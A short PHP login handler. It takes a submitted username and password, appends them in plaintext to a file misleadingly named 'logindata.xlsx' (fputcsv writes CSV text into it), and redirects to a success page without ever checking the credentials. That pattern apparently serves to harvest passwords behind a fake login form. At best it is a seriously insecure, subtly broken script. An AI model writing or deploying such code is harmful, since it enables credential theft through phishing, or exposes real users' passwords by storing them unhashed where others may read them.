<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
  $username = $_POST['username'];
  $password = $_POST['password'];

  // Create a new row in the Excel file
  $file = 'logindata.xlsx';
  $data = [$username, $password];
  $handle = fopen($file, 'a');
  fputcsv($handle, $data);
  fclose($handle);

  // Redirect to a success page or perform any other actions upon successful login
  header('Location: success.html');
  exit;
}
?>
